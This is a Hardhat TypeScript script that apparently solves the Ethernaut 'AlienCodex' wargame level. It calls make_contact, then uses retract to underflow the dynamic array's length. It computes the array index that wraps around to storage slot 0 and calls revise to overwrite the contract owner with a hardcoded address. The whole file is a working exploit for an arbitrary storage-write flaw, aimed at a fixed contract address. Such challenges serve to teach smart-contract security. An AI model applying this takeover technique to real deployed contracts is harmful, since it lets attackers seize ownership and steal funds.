import { ethers } from 'hardhat'
import { AlienCodex } from '../types/typechain/AlienCodex'

async function main() {
  const targetAddr = '0x4B104AE5361161175baBa72EA77615E878A81433'

  const fac = await ethers.getContractFactory('AlienCodex')
  const target = fac.attach(targetAddr) as AlienCodex

  // to pass modifier assert()
  await target.make_contact()

  // # Slot of array
  const dataLocation = ethers.utils.keccak256(
    '0x0000000000000000000000000000000000000000000000000000000000000001'
  )

  // set length to max 0xfff..ff by underflow
  // to be able to access all indexes with array[i]
  await target.retract()

  for (let i = 0; i < 5; i++) {
    console.log(i, ' ', await ethers.provider.getStorageAt(target.address, i))
  }

  //  calculate diff until array overflows
  const locationAsBN = ethers.BigNumber.from(dataLocation)
  const maxStorage = ethers.BigNumber.from(2).pow(256)
  const diffToOverflow = maxStorage.sub(locationAsBN)

  // console.log('maxStorage', maxStorage)
  // console.log('Diff', diffToOverflow)

  // set storage at overflowed location -> overrides slot 0
  // where vars owner address & contacted are stored
  await target.revise(
    diffToOverflow,
    '0x00000000000000000000000021db76B75db2f5d4f9505Eae7d8cE53eB9AEd2B5'
  )
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
